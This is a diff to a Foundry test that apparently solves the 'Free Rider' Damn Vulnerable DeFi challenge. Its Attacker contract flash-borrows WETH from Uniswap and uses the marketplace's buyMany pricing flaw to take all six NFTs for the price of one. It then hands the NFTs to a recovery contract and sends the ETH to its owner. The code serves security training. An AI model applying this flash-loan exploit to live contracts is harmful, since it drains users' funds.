@@ -54,7 +54,7 @@ contract FreeRider is Test {
         // Attacker starts with little ETH balance
         attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.label(attacker, "Attacker");
-        vm.deal(attacker, 0.5 ether);
+        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);
 
         // Deploy WETH contract
         weth = new WETH9();
@@ -134,6 +134,17 @@ contract FreeRider is Test {
          */
         vm.startPrank(attacker, attacker);
 
+        // Deploy the attacker contract
+        Attacker attackerContract = new Attacker(
+            address(uniswapV2Pair),
+            address(weth),
+            address(freeRiderNFTMarketplace),
+            address(freeRiderRecovery),
+            address(damnValuableNFT)
+        );
+        vm.label(address(attackerContract), "Attacker Contract");
+        attackerContract.attack();
+
         vm.stopPrank();
         /**
          * EXPLOIT END *
@@ -163,4 +174,109 @@ contract FreeRider is Test {
         assertEq(freeRiderNFTMarketplace.offersCount(), 0);
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
+}
+
+interface IUniswapV2Callee {
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
+}
+
+interface IERC721Receiver {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4);
+}
+
+contract Attacker is IUniswapV2Callee, IERC721Receiver {
+    uint256 private constant _NFT_PRICE = 15 ether;
+
+    IUniswapV2Pair private _uniswapV2Pair;
+    WETH9 private _weth;
+    FreeRiderNFTMarketplace private _freeRiderNFTMarketplace;
+    FreeRiderRecovery private _freeRiderRecovery;
+    DamnValuableNFT private _damnValuableNFT;
+
+    address private _owner;
+
+    constructor(
+        address uniswapV2Pair,
+        address weth,
+        address freeRiderNFTMarketplace,
+        address freeRiderRecovery,
+        address damnValuableNFT
+    ) {
+        _uniswapV2Pair = IUniswapV2Pair(uniswapV2Pair);
+        _weth = WETH9(payable(weth));
+        _freeRiderNFTMarketplace = FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace));
+        _freeRiderRecovery = FreeRiderRecovery(freeRiderRecovery);
+        _damnValuableNFT = DamnValuableNFT(damnValuableNFT);
+        _owner = msg.sender;
+    }
+
+    function attack() external {
+        address token0 = _uniswapV2Pair.token0();
+        (uint256 amount0Out, uint256 amount1Out) = token0 == address(_weth) ? (_NFT_PRICE, uint256(0)) : (0, _NFT_PRICE);
+        _uniswapV2Pair.swap(amount0Out, amount1Out, address(this), "attack");
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external override {
+        if (msg.sender != address(_uniswapV2Pair)) {
+            return;
+        }
+
+        uint256 wethAmount = amount0 > 0 ? amount0 : amount1;
+        if (wethAmount < _NFT_PRICE) {
+            return;
+        }
+
+        _weth.withdraw(wethAmount);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint8 i = 0; i < 6;) {
+            tokenIds[i] = i;
+            unchecked {
+                ++i;
+            }
+        }
+
+        _freeRiderNFTMarketplace.buyMany{value: wethAmount}(tokenIds);
+
+        uint256 payback = (_NFT_PRICE * 1000 / 997) + 1;
+
+        _weth.deposit{value: payback}();
+
+        _weth.transfer(address(_uniswapV2Pair), payback);
+
+        for (uint8 i = 0; i < 6;) {
+            _damnValuableNFT.approve(_owner, i);
+
+            bytes memory callData = abi.encodeWithSignature(
+                "safeTransferFrom(address,address,uint256,bytes)",
+                address(this),
+                address(_freeRiderRecovery),
+                i,
+                abi.encode(address(this))
+            );
+
+            (bool success,) = address(_damnValuableNFT).call(callData);
+            if (!success) {
+                revert("Transfer failed");
+            }
+
+            unchecked {
+                ++i;
+            }
+        }
+
+        (bool success,) = _owner.call{value: address(this).balance}("");
+        if (!success) {
+            revert("Transfer failed");
+        }
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+    fallback() external payable {}
 }
